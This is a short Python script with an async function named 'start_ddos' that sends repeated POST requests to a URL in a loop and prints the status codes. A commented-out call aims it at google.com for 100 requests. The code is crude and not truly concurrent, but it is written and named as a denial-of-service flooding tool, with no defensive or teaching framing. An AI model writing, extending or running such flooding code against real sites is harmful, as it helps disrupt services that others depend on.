import asyncio
import tkinter as tk

import requests


async def start_ddos(url: str, loopNum: int):
    await asyncio.sleep(1)
    for i in range(loopNum):
        try:
            request = requests.post(url, "ping")
            print(request.status_code)
        except Exception as err:
            print(err)


# asyncio.run(start_ddos("http://www.google.com", 100))
